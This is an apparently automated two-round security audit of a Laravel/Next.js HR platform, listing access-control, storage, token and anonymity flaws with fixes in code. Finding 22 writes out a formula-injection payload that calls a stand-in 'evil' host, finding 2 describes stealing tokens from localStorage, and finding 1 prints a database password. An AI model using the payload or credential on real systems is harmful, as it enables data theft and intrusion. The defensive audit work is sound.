# Security Audit Report

**Date:** July 6, 2026  
**Project:** Viteseo Platform HRIS  
**Auditor:** Automated Security Review

---

## Executive Summary

This security audit identified **18 vulnerabilities** across the Laravel backend and Next.js frontend, including **4 critical**, **4 high**, **6 medium**, and **4 low** severity issues. The most pressing concerns involve exposed credentials, token storage vulnerabilities, missing rate limiting, and authorization gaps.

---

## Critical Severity

### 1. Exposed Credentials in Environment Files

**Location:** `backend/.env:28`  
**Risk:** Database compromise, session forgery

**In plain terms:** The DB password and app key live in `.env`; if that file ever leaks, an attacker gets the keys to your data. *Example:* `.env` is accidentally committed to a public repo and anyone reading it can connect to the database. *(Verified: it is not in git today, so the real risk is low.)*

**Issue:**
- Database password `Viteseo_App_2026` visible in `.env` file
- `APP_KEY` exposed - if leaked, allows session/cookie forgery and decryption of encrypted data
- While `.gitignore` excludes `.env`, verify it's not in git history

**Recommended Fixes:**
```bash
# 1. Check git history for exposed credentials
git log --all --full-history -- backend/.env

# 2. If found in history, rotate ALL credentials immediately:
#    - Generate new APP_KEY
php artisan key:generate

#    - Change database password
#    - Revoke and regenerate all API tokens

# 3. Use environment-specific .env files
#    - .env.local (local development)
#    - .env.production (production, never commit)

# 4. Consider using a secrets manager (AWS Secrets Manager, HashiCorp Vault)
```

---

### 2. API Tokens Stored in localStorage

**Location:** `frontend/src/core/auth-context.tsx:60`, `frontend/src/core/api-client.ts:11`  
**Risk:** Token theft via XSS attacks

**In plain terms:** The login token sits in the browser's `localStorage`, which any script on the page can read — so a malicious script can copy it and reuse it as you. *Example:* an XSS bug runs `localStorage.getItem('token')`, sends it to the attacker, and they call the API as you from their own machine. *(The danger isn't you seeing your own token — it's a remote attacker stealing it.)*

**Issue:**
```typescript
localStorage.setItem("token", res.token);  // Vulnerable to XSS
```
Any XSS vulnerability can steal the token via `localStorage.getItem("token")`.

**Recommended Fixes:**

**Option A: HttpOnly Cookies (Recommended)**
```typescript
// Backend: Set token as httpOnly cookie
return response()->json(['data' => [...]])
    ->cookie('auth_token', $token, 60 * 24, '/', null, true, true, false, 'Strict');

// Frontend: Remove manual token handling
// Axios will automatically send cookies
export const apiClient = axios.create({
  baseURL: process.env.NEXT_PUBLIC_API_BASE_URL,
  withCredentials: true,  // Send cookies
  headers: { Accept: "application/json" },
});
```

**Option B: In-Memory Storage (Alternative)**
```typescript
// Store token in memory only (lost on refresh)
let authToken: string | null = null;

export const setToken = (token: string) => { authToken = token; };
export const getToken = () => authToken;

// On refresh, call /me endpoint to restore session
```

---

### 3. No Rate Limiting on Login Endpoint

**Location:** `backend/routes/api.php:12`  
**Risk:** Brute-force password attacks

**In plain terms:** Login accepts unlimited attempts, so passwords can be guessed at machine speed. *Example:* a script tries 10,000 passwords a minute against `hr@viteseo.ph` until one works.

**Issue:**
```php
Route::post('login', [AuthController::class, 'login']);  // No throttle
```

**Recommended Fixes:**
```php
// Add throttle middleware to login route
Route::post('login', [AuthController::class, 'login'])
    ->middleware('throttle:login');

// Configure rate limiter in app/Providers/AppServiceProvider.php
use Illuminate\Cache\RateLimiting\Limit;
use Illuminate\Support\Facades\RateLimiter;

public function boot(): void
{
    RateLimiter::for('login', function (Request $request) {
        $email = (string) $request->input('email');
        $ip = $request->ip();
        
        return Limit::perMinute(5)->by($email . '|' . $ip);
    });
}

// Optional: Add exponential backoff
RateLimiter::for('login', function (Request $request) {
    return Limit::perMinute(5)->response(function () {
        return response()->json([
            'message' => 'Too many login attempts. Please try again later.',
        ], 429);
    });
});
```

---

### 4. Hardcoded Default Password

**Location:** `backend/app/Modules/Hr/Services/EmployeeService.php:48`  
**Risk:** Weak initial passwords, no forced change

**In plain terms:** Every HR-created employee gets the password `password`, with no forced change. *Example:* an attacker logs into a new hire's account with `password` before the employee ever does.

**Issue:**
```php
'password' => Hash::make($data['password'] ?? 'password'),
```

**Recommended Fixes:**
```php
// 1. Require password during employee creation
public function rules(): array
{
    return [
        'password' => ['required', 'string', 'min:8', 'confirmed'],
        // ... other rules
    ];
}

// 2. Generate secure random password if not provided
use Illuminate\Support\Str;

'password' => Hash::make($data['password'] ?? Str::random(16)),

// 3. Add password_reset_required flag to users table
Schema::table('users', function (Blueprint $table) {
    $table->boolean('password_reset_required')->default(false);
});

// 4. Force password change on first login
public function login(LoginRequest $request): JsonResponse
{
    // ... existing auth logic
    
    if ($user->password_reset_required) {
        return response()->json([
            'data' => [
                'requires_password_reset' => true,
                'token' => $token,
            ],
        ]);
    }
}
```

---

## High Severity

### 5. Insecure Direct Object References (IDOR)

**Location:** Multiple controllers  
**Risk:** Unauthorized access to other users' data

**In plain terms:** The worry was that changing an ID in a URL could open someone else's record. *Example (why it's OK):* payslip endpoints already verify the record is yours, and "any HR can approve any leave" is intentional and HR-gated — so this is a **false positive**.

**Issues:**
- `LeaveController::approve/reject` - Any HR officer can approve any leave
- `ReimbursementController::approve/reject/markPaid` - No ownership verification
- `PayrollController::showPayslip` - Route model binding without authorization

**Recommended Fixes:**

**Add Policy Classes:**
```php
// app/Modules/Hr/Policies/LeaveRequestPolicy.php
class LeaveRequestPolicy
{
    public function approve(User $user, LeaveRequest $leaveRequest): bool
    {
        // Only HR officers can approve
        return $user->hasRole('hr_officer');
    }
    
    public function view(User $user, LeaveRequest $leaveRequest): bool
    {
        // HR can view all, employees only their own
        return $user->hasRole('hr_officer') 
            || $leaveRequest->employee->user_id === $user->id;
    }
}

// Register in AuthServiceProvider
protected $policies = [
    LeaveRequest::class => LeaveRequestPolicy::class,
    Reimbursement::class => ReimbursementPolicy::class,
];

// Use in controllers
public function approve(Request $request, LeaveRequest $leaveRequest): JsonResponse
{
    $this->authorize('approve', $leaveRequest);
    
    $updated = $this->service->approve($leaveRequest, $request->user());
    return LeaveRequestResource::make($updated)->response();
}
```

**Add Middleware for Route Model Binding:**
```php
// In routes/api.php
Route::middleware(['auth:sanctum', 'can:view,payslip'])
    ->get('me/payslips/{payslip}', [PayrollController::class, 'showPayslip']);
```

---

### 6. Unrestricted File Upload

**Location:** `backend/app/Modules/Hr/Services/ReimbursementService.php:47`  
**Risk:** Malicious file upload, public file access

**In plain terms:** Uploads were thought to be unchecked and publicly reachable. *Example:* type and size **are** actually validated; the genuine problem is public storage — see **#20**.

**Issue:**
```php
$path = $receipt->store('receipts', 'public');  // Publicly accessible
```

**Recommended Fixes:**
```php
// 1. Store on private disk
$path = $receipt->store('receipts', 'private');

// 2. Serve via authenticated route
Route::get('reimbursements/{reimbursement}/receipt', function (Reimbursement $reimbursement) {
    // Authorization check
    if (!auth()->user()->hasRole('hr_officer') && $reimbursement->employee->user_id !== auth()->id()) {
        abort(403);
    }
    
    return response()->file(storage_path('app/private/' . $reimbursement->receipt_path));
});

// 3. Add file validation
public function rules(): array
{
    return [
        'receipt' => [
            'nullable',
            'file',
            'mimes:jpg,jpeg,png,pdf',
            'max:5120',
            // Add custom validation for file content
            function ($attribute, $value, $fail) {
                if ($value && !$this->isValidFile($value)) {
                    $fail('The file appears to be corrupted or malicious.');
                }
            },
        ],
    ];
}

private function isValidFile($file): bool
{
    // Check MIME type matches extension
    $mimeType = $file->getMimeType();
    $extension = $file->getClientOriginalExtension();
    
    $allowedMimes = [
        'jpg' => 'image/jpeg',
        'jpeg' => 'image/jpeg',
        'png' => 'image/png',
        'pdf' => 'application/pdf',
    ];
    
    return isset($allowedMimes[$extension]) && $allowedMimes[$extension] === $mimeType;
}

// 4. Sanitize filename
$path = $receipt->storeAs('receipts', 
    Str::random(40) . '.' . $receipt->getClientOriginalExtension(),
    'private'
);

// 5. Scan files with ClamAV (if available)
// Install: apt-get install clamav
use Sunra\PhpSimple\HtmlDomParser;

private function scanFile($path): bool
{
    $output = shell_exec("clamscan --no-summary " . escapeshellarg($path));
    return strpos($output, 'FOUND') === false;
}
```

---

### 7. CORS Hardcoded to Localhost

**Location:** `backend/config/cors.php:21`  
**Risk:** Production deployment failure, security misconfiguration

**In plain terms:** The API only accepts calls from `localhost`, which must be set per-environment before launch. *Example:* the deployed frontend at `app.viteseo.ph` is blocked until its real origin is configured. *(Deployment concern, not a live exploit.)*

**Issue:**
```php
'allowed_origins' => ['http://localhost:3000'],
```

**Recommended Fixes:**
```php
// config/cors.php
return [
    'paths' => ['api/*'],
    'allowed_methods' => ['GET', 'POST', 'PUT', 'PATCH', 'DELETE'],  // Be specific
    'allowed_origins' => array_filter([
        env('FRONTEND_URL'),  // Production URL
        env('APP_ENV') === 'local' ? 'http://localhost:3000' : null,
    ]),
    'allowed_headers' => ['Content-Type', 'Authorization', 'X-Requested-With'],
    'exposed_headers' => [],
    'max_age' => 3600,
    'supports_credentials' => false,
];

// .env.production
FRONTEND_URL=https://hris.viteseo.ph
```

---

### 8. No HTTPS Enforcement

**Location:** `backend/.env`, `backend/config/session.php`  
**Risk:** Token interception, session hijacking

**In plain terms:** Without forced HTTPS, tokens can travel over plain HTTP and be sniffed in transit. *Example:* on public Wi-Fi an attacker reads the token off an unencrypted request. *(Production concern.)*

**Issue:**
- `SESSION_SECURE_COOKIE` not set
- Tokens sent over HTTP in production

**Recommended Fixes:**
```bash
# .env.production
SESSION_SECURE_COOKIE=true
SESSION_SAME_SITE=strict
SESSION_HTTP_ONLY=true

# Force HTTPS in production
# app/Http/Middleware/TrustProxies.php
protected $proxies = '*';  // If behind load balancer

# Add HSTS header in middleware
# app/Http/Middleware/SecureHeaders.php
class SecureHeaders
{
    public function handle($request, Closure $next)
    {
        $response = $next($request);
        
        if (app()->environment('production')) {
            $response->headers->set('Strict-Transport-Security', 
                'max-age=31536000; includeSubDomains');
        }
        
        return $response;
    }
}
```

---

## Medium Severity

### 9. Debug Mode Enabled

**Location:** `backend/.env:4`  
**Risk:** Information disclosure, stack traces exposed

**In plain terms:** `APP_DEBUG=true` shows full error stack traces, revealing internal file paths and queries. *Example:* a broken request returns a page exposing file paths and SQL (you saw this in our 422 test). *(Turn off in production.)*

**Issue:**
```
APP_DEBUG=true
```

**Recommended Fixes:**
```bash
# .env.production
APP_DEBUG=false
APP_ENV=production

# Add custom error handler for production
# app/Exceptions/Handler.php
public function render($request, Throwable $e)
{
    if (app()->environment('production') && !$this->isHttpException($e)) {
        return response()->json([
            'message' => 'An error occurred. Please try again later.',
        ], 500);
    }
    
    return parent::render($request, $e);
}
```

---

### 10. No Content-Security-Policy Headers

**Location:** No security headers middleware  
**Risk:** XSS, clickjacking, MIME sniffing

**In plain terms:** Missing browser security headers make client-side attacks easier. *Example:* the site could be loaded inside an attacker's invisible iframe to hijack clicks (clickjacking). *(Mostly a frontend concern.)*

**Recommended Fixes:**
```php
// app/Http/Middleware/SecurityHeaders.php
namespace App\Http\Middleware;

use Closure;

class SecurityHeaders
{
    public function handle($request, Closure $next)
    {
        $response = $next($request);
        
        $response->headers->set('X-Content-Type-Options', 'nosniff');
        $response->headers->set('X-Frame-Options', 'DENY');
        $response->headers->set('X-XSS-Protection', '1; mode=block');
        $response->headers->set('Referrer-Policy', 'strict-origin-when-cross-origin');
        
        if (app()->environment('production')) {
            $response->headers->set('Content-Security-Policy', 
                "default-src 'self'; " .
                "script-src 'self'; " .
                "style-src 'self' 'unsafe-inline'; " .
                "img-src 'self' data: https:; " .
                "font-src 'self' data:; " .
                "connect-src 'self' " . env('FRONTEND_URL')
            );
        }
        
        return $response;
    }
}

// Register in bootstrap/app.php
->withMiddleware(function (Middleware $middleware) {
    $middleware->append(SecurityHeaders::class);
})
```

---

### 11. SQL Injection Risk in ReportService

**Location:** `backend/app/Modules/Hr/Services/ReportService.php:54`  
**Risk:** SQL injection if user input reaches query

**In plain terms:** The worry was user input being pasted into raw SQL. *Example (why it's OK):* every raw query uses fixed strings or bound parameters — no user input reaches SQL, so this is a **false positive**.

**Issue:**
```php
->selectRaw('hr_departments.name, count(*) as count')
```

**Recommended Fixes:**
```php
// Verify no user input in selectRaw
// If dynamic columns needed, use whitelist:
class ReportService
{
    private const ALLOWED_GROUP_BY = ['department', 'status', 'month'];
    
    public function generate(string $groupBy): Collection
    {
        if (!in_array($groupBy, self::ALLOWED_GROUP_BY, true)) {
            throw new InvalidArgumentException('Invalid group by column');
        }
        
        // Use parameterized queries for WHERE clauses
        return DB::table('hr_employees')
            ->select('hr_departments.name', DB::raw('count(*) as count'))
            ->join('hr_departments', 'hr_employees.department_id', '=', 'hr_departments.id')
            ->when($departmentId, fn($q) => $q->where('department_id', $departmentId))
            ->groupBy('hr_departments.name')
            ->get();
    }
}
```

---

### 12. Session Data Not Encrypted

**Location:** `backend/.env:32`  
**Risk:** Sensitive data exposure if database compromised

**In plain terms:** Session data isn't encrypted at rest. *Example:* not applicable in practice — the app authenticates with tokens, not sessions, and stores nothing sensitive in them.

**Issue:**
```
SESSION_ENCRYPT=false
```

**Recommended Fixes:**
```bash
# .env.production
SESSION_ENCRYPT=true

# Avoid storing sensitive data in sessions
// Bad
session(['user_bank_account' => $account]);

// Good - store only IDs, fetch on demand
session(['user_id' => $user->id]);
```

---

### 13. No Token Expiration

**Location:** `backend/config/sanctum.php`  
**Risk:** Stolen tokens valid indefinitely

**In plain terms:** A token never expires, so a leaked one keeps working forever. *Example:* a token pulled from an old backup still logs the attacker in a year later.

**Recommended Fixes:**
```php
// config/sanctum.php
'expiration' => 60 * 24,  // 24 hours in minutes

// Add refresh token mechanism
// app/Http/Controllers/AuthController.php
public function login(LoginRequest $request): JsonResponse
{
    // ... auth logic
    
    $token = $user->createToken('web', ['*'], now()->addDay())->plainTextToken;
    
    return response()->json([
        'data' => [
            'token' => $token,
            'expires_at' => now()->addDay()->toISOString(),
            // ... other data
        ],
    ]);
}

// Add refresh endpoint
Route::post('auth/refresh', function (Request $request) {
    $user = $request->user();
    $user->currentAccessToken()->delete();
    $token = $user->createToken('web', ['*'], now()->addDay())->plainTextToken;
    
    return response()->json(['data' => ['token' => $token]]);
})->middleware('auth:sanctum');
```

---

### 14. Verbose Logging May Expose Sensitive Data

**Location:** `backend/.env:21`  
**Risk:** Sensitive data in logs (passwords, tokens, PII)

**In plain terms:** `LOG_LEVEL=debug` can write sensitive detail into log files. *Example:* a debug line records a request payload containing PII. *(Lower the level in production.)*

**Issue:**
```
LOG_LEVEL=debug
```

**Recommended Fixes:**
```bash
# .env.production
LOG_LEVEL=error

# Sanitize logs
// config/logging.php
'channels' => [
    'stack' => [
        'driver' => 'stack',
        'channels' => ['single'],
        'ignore_exceptions' => false,
    ],
    'single' => [
        'driver' => 'single',
        'path' => storage_path('logs/laravel.log'),
        'level' => env('LOG_LEVEL', 'debug'),
        'replace_placeholders' => true,
    ],
],

// Never log sensitive data
Log::info('User logged in', ['user_id' => $user->id]);  // Good
Log::info('User logged in', ['password' => $password]);  // Bad

// Add context processor to filter sensitive fields
// app/Logging/SensitiveDataProcessor.php
class SensitiveDataProcessor
{
    public function __invoke(array $record): array
    {
        $sensitive = ['password', 'token', 'secret', 'credit_card', 'bank_account'];
        
        foreach ($sensitive as $key) {
            if (isset($record['context'][$key])) {
                $record['context'][$key] = '[REDACTED]';
            }
        }
        
        return $record;
    }
}
```

---

## Low Severity

### 15. No Email Verification

**Location:** Not implemented  
**Risk:** Account takeover via typos, fake emails

**In plain terms:** Email addresses aren't verified on signup. *Example:* not applicable here — HR creates accounts, so there is no public self-registration to verify.

**Recommended Fixes:**
```php
// Add email verification
// app/Models/User.php
use Illuminate\Contracts\Auth\MustVerifyEmail;

class User extends Authenticatable implements MustVerifyEmail
{
    // ...
}

// Require verification for sensitive routes
Route::middleware(['auth:sanctum', 'verified'])->group(function () {
    // HR routes
});

// Send verification email on registration
$user->sendEmailVerificationNotification();
```

---

### 16. Wildcard CORS Methods and Headers

**Location:** `backend/config/cors.php:19,25`  
**Risk:** Overly permissive CORS policy

**In plain terms:** Allowing all HTTP methods/headers is broader than needed. *Example:* minor — tighten to the specific methods/headers actually used. *(Low risk while origins are restricted.)*

**Issue:**
```php
'allowed_methods' => ['*'],
'allowed_headers' => ['*'],
```

**Recommended Fixes:**
```php
// config/cors.php
'allowed_methods' => ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS'],
'allowed_headers' => [
    'Content-Type',
    'Authorization',
    'X-Requested-With',
    'Accept',
    'Origin',
],
```

---

### 17. No Account Lockout

**Location:** Not implemented  
**Risk:** Persistent brute-force attacks

**In plain terms:** No lockout after repeated failed logins (companion to #3). *Example:* an attacker keeps guessing with no cooldown; a 15-minute lock after ~5 failures would stop them.

**Recommended Fixes:**
```php
// Add failed login tracking
// database/migrations/xxxx_add_failed_logins_to_users.php
Schema::table('users', function (Blueprint $table) {
    $table->integer('failed_login_attempts')->default(0);
    $table->timestamp('locked_until')->nullable();
});

// app/Http/Controllers/AuthController.php
public function login(LoginRequest $request): JsonResponse
{
    $user = User::where('email', $request->email)->first();
    
    if ($user && $user->locked_until && $user->locked_until->isFuture()) {
        throw ValidationException::withMessages([
            'email' => ['Account locked. Try again in ' . $user->locked_until->diffInMinutes(now()) . ' minutes.'],
        ]);
    }
    
    if (!Auth::attempt($credentials)) {
        if ($user) {
            $user->increment('failed_login_attempts');
            
            if ($user->failed_login_attempts >= 5) {
                $user->update(['locked_until' => now()->addMinutes(15)]);
            }
        }
        
        throw ValidationException::withMessages([
            'email' => ['The provided credentials are incorrect.'],
        ]);
    }
    
    // Reset on successful login
    $user->update([
        'failed_login_attempts' => 0,
        'locked_until' => null,
    ]);
    
    // ... rest of login
}
```

---

### 18. Bank Account Stored Plaintext

**Location:** `backend/app/Modules/Hr/Models/Employee.php:30`  
**Risk:** PII exposure if database compromised

**In plain terms:** Bank account numbers are stored unencrypted. *Example:* a leaked DB backup exposes every employee's account number in plain text.

**Issue:**
```php
protected $fillable = [
    'bank_account',  // Stored plaintext
];
```

**Recommended Fixes:**
```php
// Use Laravel's encryption
// app/Modules/Hr/Models/Employee.php
use Illuminate\Database\Eloquent\Casts\Attribute;

protected function bankAccount(): Attribute
{
    return Attribute::make(
        get: fn ($value) => $value ? decrypt($value) : null,
        set: fn ($value) => $value ? encrypt($value) : null,
    );
}

// Or use custom cast
// app/Casts/Encrypted.php
class Encrypted implements CastsAttributes
{
    public function get($model, string $key, $value, array $attributes)
    {
        return $value ? decrypt($value) : null;
    }

    public function set($model, string $key, $value, array $attributes)
    {
        return $value ? encrypt($value) : null;
    }
}

// In model
protected $casts = [
    'bank_account' => Encrypted::class,
];

// Mask in API responses
// app/Modules/Hr/Http/Resources/EmployeeResource.php
public function toArray($request): array
{
    return [
        'id' => $this->id,
        'bank_account' => $this->when(
            $request->user()->hasRole('hr_officer'),
            fn () => '****' . substr($this->bank_account, -4)
        ),
    ];
}
```

---

## Implementation Priority

### Phase 1: Critical (Immediate)
1. ✅ Rotate exposed credentials
2. ✅ Move tokens to httpOnly cookies
3. ✅ Add rate limiting to login
4. ✅ Remove hardcoded default password

### Phase 2: High (Week 1)
5. ✅ Implement authorization policies
6. ✅ Secure file uploads
7. ✅ Fix CORS configuration
8. ✅ Enforce HTTPS

### Phase 3: Medium (Week 2)
9. ✅ Disable debug mode in production
10. ✅ Add security headers
11. ✅ Audit SQL queries
12. ✅ Enable session encryption
13. ✅ Set token expiration
14. ✅ Sanitize logs

### Phase 4: Low (Week 3)
15. ✅ Add email verification
16. ✅ Restrict CORS methods/headers
17. ✅ Implement account lockout
18. ✅ Encrypt sensitive PII

---

## Additional Recommendations

### Security Testing
- Add automated security scanning to CI/CD (OWASP ZAP, Snyk)
- Perform regular penetration testing
- Enable Dependabot for dependency updates

### Monitoring
- Set up intrusion detection (fail2ban, AWS GuardDuty)
- Monitor for suspicious login patterns
- Alert on failed login spikes

### Compliance
- Review data retention policies
- Implement GDPR/privacy compliance
- Document data processing activities

---

## References

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Laravel Security Documentation](https://laravel.com/docs/security)
- [Next.js Security Best Practices](https://nextjs.org/docs/app/building-your-application/authentication)

---

**Next Review Date:** August 6, 2026

---
---

# Follow-up Audit — July 14, 2026

**Auditor:** Automated Security Review (round 2)
**Scope:** New code since the July 6 audit — role management, benefits, report exports (CSV/PDF), recruitment emails/rejection, concern → meeting scheduling, and file-upload features.

## Executive Summary

Round 2 found **6 new vulnerabilities** not covered by the original 18: **1 critical**, **2 high**, **2 medium**, **1 low**. The standout is a **privacy-invariant break**: the Audit Trail de-anonymizes anonymous concern reporters. Two others (public file storage, unrestricted role granting) are serious access-control gaps.

| # | Severity | Finding |
|---|---|---|
| 19 | Critical | Audit Trail de-anonymizes anonymous concern submitters |
| 20 | High | Uploaded files (resumes, employee documents) stored on the public disk |
| 21 | High | Privilege escalation — any HR officer can grant HR-officer access |
| 22 | Medium | CSV formula injection in report exports |
| 23 | Medium | "Restricted" reports are not restricted beyond any HR officer |
| 24 | Low | No rate limiting on candidate-email endpoints |

---

## Critical Severity

### 19. Audit Trail De-anonymizes Anonymous Concern Submitters

**Location:** `app/Modules/Hr/Services/AuditService.php` (`log()`), `app/Modules/Hr/Services/ConcernService.php:48`, surfaced by `app/Modules/Hr/Services/ReportService.php:697` (Audit Trail report + CSV export)
**Risk:** Breaks the system's core anonymity invariant — retaliation risk against whistle-blowers/reporters

**In plain terms:** An anonymous concern is logged as the person who filed it, and any HR officer can read that log — so "anonymous" isn't. *Example:* HR opens the Audit Trail and sees "Jane Cruz · submitted · concern (CN-AB12)" matching the anonymous report, identifying the reporter.

**Issue:**
`AuditService::log()` stamps every entry with the acting user and their IP:
```php
AuditLog::create([
    'user_id' => Auth::id(),
    // ...
    'ip_address' => request()?->ip(),
]);
```
An **anonymous** concern is submitted *by the reporting employee* (`POST /hr/me/concerns`), and `ConcernService::create()` writes an audit entry **as that employee**:
```php
$this->audit->log('submitted', 'Concerns', "{$concern->category} concern ({$concern->reference_no})", $concern);
```
The **Audit Trail report** (visible to — and CSV-exportable by — any HR officer) renders `'user' => $a->user?->name` alongside the concern reference number. Any HR officer can therefore match a reference (e.g. `CN-UXBYV8`) shown as "Anonymous" in the Concerns queue to the audit row that names the submitter (and logs their IP). The `auditable_id` also links the actor row directly to the concern record.

**Recommended Fixes:**
```php
// 1. Never attribute an anonymous submission to its author. In ConcernService::create():
$this->audit->logAnonymous('submitted', 'Concerns', "{$concern->category} concern ({$concern->reference_no})");
// where logAnonymous() forces user_id = null AND ip_address = null.

// 2. Belt-and-braces: exclude Concerns-module submit rows from the Audit Trail report,
//    or redact the actor for module = 'Concerns' + action = 'submitted'.

// 3. Restrict the Audit Trail report itself to admins (see #23).
```
Verify no other "self-service" audit call (e.g. concern status/meeting entries) leaks the reporter — those already use reference-only descriptions, but they run as the HR actor, which is fine.

---

## High Severity

### 20. Uploaded Files Stored on the Public Disk (Auth Bypass)

**Location:** `app/Modules/Hr/Services/RecruitmentService.php:167` (resumes), `app/Modules/Hr/Services/EmployeeService.php:326` (employee documents)
**Risk:** Unauthenticated access to candidate PII and HR documents; defeats an existing access-control feature

**In plain terms:** Resumes and employee documents sit on the public disk, so their URLs open without logging in — skipping the access-request gate. *Example:* pasting `…/storage/hr/resumes/5/abc.pdf` into any browser downloads a resume even when signed out.

**Issue:**
```php
$resume->store("hr/resumes/{$requisition->id}", 'public');          // resumes
$file->store("hr/employee-documents/{$employee->id}", 'public');     // employee docs
```
Files on the `public` disk are served at `/storage/...` **with no authentication**. Two consequences:
- **Candidate resumes** (names, contact details, work history) are world-readable to anyone who knows/guesses the path (`resume_url` is even emitted in `CandidateResource`).
- **Employee documents** are gated in the app by a "request access → HR approves → download unlocks" flow (`MyDocuments`), but that gate is **only applied to the API's URL field** — the underlying file sits on the public disk, so the raw URL bypasses the gate entirely.

This extends original finding #6 (which covered only reimbursement receipts) to two more features, one of which nullifies a deliberate security control.

**Recommended Fixes:**
```php
// 1. Store on the private ('local') disk:
$resume->store("hr/resumes/{$requisition->id}", 'local');
$file->store("hr/employee-documents/{$employee->id}", 'local');

// 2. Serve via authenticated, authorized routes that stream the file after a policy check,
//    e.g. GET /hr/employees/{employee}/documents/{document}/download with the same
//    ownership/approval checks the access-request flow already implements.

// 3. Migrate existing files off public/ and remove the public URLs from the resources.
```

---

### 21. Privilege Escalation — Any HR Officer Can Grant HR-Officer Access

**Location:** `app/Modules/Hr/Routes/api.php` (`POST employees/{employee}/hr-role`), `app/Modules/Hr/Services/EmployeeService.php:294` (`setHrRole`)
**Risk:** Any HR account (or a compromised one) can mint more admin-equivalent accounts and persist access

**In plain terms:** Any HR officer can grant full HR access to anyone, with no admin gate. *Example:* a phished HR login promotes a fake account to HR Officer as a permanent backdoor into all payroll and records.

**Issue:**
The role-grant endpoint sits inside the `role:hr_officer` group, and the service only blocks self-*revocation*:
```php
Route::post('employees/{employee}/hr-role', [EmployeeController::class, 'setHrRole']); // role:hr_officer only
// setHrRole(): guards against removing your OWN access, nothing else
```
`hr_officer` is effectively admin (it holds every HR permission). There is **no `role:admin` gate anywhere in the app** — the `admin` role exists but is never enforced. So any HR officer can promote arbitrary users to full HR access, and a compromised HR token can create durable backdoor accounts.

**Recommended Fixes:**
```php
// Gate role granting behind admin (or a dedicated hr.roles.manage permission):
Route::post('employees/{employee}/hr-role', [EmployeeController::class, 'setHrRole'])
    ->middleware('role:admin');
// Seed at least one admin; log grants immutably; consider requiring re-auth (step-up) for this action.
```

---

## Medium Severity

### 22. CSV Formula Injection in Report Exports

**Location:** `app/Modules/Hr/Services/ReportService.php` (`buildCsv()`, `fputcsv` at ~line 131)
**Risk:** Code/formula execution in the recipient's spreadsheet app (data exfiltration via DDE/HYPERLINK)

**In plain terms:** Exported CSV cells that start with `=` are run as formulas by Excel/Sheets. *Example:* an employee sets their name to `=HYPERLINK(...)`; it executes when HR opens the exported audit CSV.

**Issue:**
The Audit Trail CSV writes user-influenced values (actor names, free-text descriptions, table cells) straight through `fputcsv` with no neutralization:
```php
$rows[] = [$e['timestamp'], $e['user'], $e['module'], $e['action'], $e['details']];
// ...
fputcsv($out, $r);
```
A value beginning with `=`, `+`, `-`, `@`, or a tab (e.g. an employee/candidate name set to `=HYPERLINK("http://evil/?"&A1,"click")`) becomes a live formula when the CSV is opened in Excel/Sheets.

**Recommended Fixes:**
```php
// Neutralize formula-triggering leading characters before writing each cell:
private function csvCell(string $v): string
{
    return preg_match('/^[=\-+@\t\r]/', $v) ? "'" . $v : $v;
}
// apply to every cell in buildCsv(); keep the UTF-8 BOM.
```

---

### 23. "Restricted" Reports Are Not Access-Restricted

**Location:** `app/Modules/Hr/Routes/api.php:104-105`, `ReportService` (`audit` + `diversity` set `'restricted' => true`)
**Risk:** Sensitive reports (audit log, demographic data) exposed to all HR officers

**In plain terms:** The "restricted" reports are only hidden in the menu, not blocked on the server. *Example:* a junior HR officer types `/hr/reports/audit` in the URL and gets the full audit log anyway.

**Issue:**
`GET/POST /hr/reports/{key}` is guarded only by `role:hr_officer`. The Audit Trail and Diversity reports are flagged `restricted: true` ("restricted to admins and HR leadership") and the UI shows a lock, but there is **no server-side enforcement** — any HR officer can view and export them. This is also what makes finding #19 reachable by any HR officer.

**Recommended Fixes:**
```php
// Enforce the restriction server-side for restricted report keys:
public function show(Request $request, string $key): JsonResponse
{
    if (in_array($key, ['audit', 'diversity'], true) && ! $request->user()->hasRole('admin')) {
        abort(403);
    }
    // ...
}
// (apply the same guard in export()).
```

---

## Low Severity

### 24. No Rate Limiting on Candidate-Email Endpoints

**Location:** `app/Modules/Hr/Routes/api.php` (`POST candidates/{candidate}/email`, `POST candidates/{candidate}/reject` with `send_email`)
**Risk:** Email-bombing candidates / sender-reputation damage once real SMTP is configured

**In plain terms:** There's no limit on candidate emails, so they can be spammed. *Example:* a loop fires 500 emails to one candidate, getting your mail domain flagged as an abuser.

**Issue:**
The stage-email and rejection endpoints dispatch real email with no throttle or per-candidate cooldown, so a scripted loop (or a rogue HR account) can flood a candidate's inbox. Currently masked by the dev mail catcher, but a live-delivery footgun.

**Recommended Fixes:**
```php
Route::post('candidates/{candidate}/email', [RecruitmentController::class, 'sendEmail'])
    ->middleware('throttle:candidate-email'); // e.g. 10/min per HR user
// Optionally short-circuit if emails_sent already contains the type (idempotency).
```

---

## Round-2 Priority

1. **#19 (Critical)** — fix the anonymity leak immediately; it undermines a guaranteed feature.
2. **#20, #21 (High)** — move uploads to private storage; gate role-granting behind admin.
3. **#22, #23 (Medium)** — sanitize CSV cells; enforce restricted-report access server-side.
4. **#24 (Low)** — throttle email endpoints before enabling live SMTP.

---

**Next Review Date:** August 14, 2026
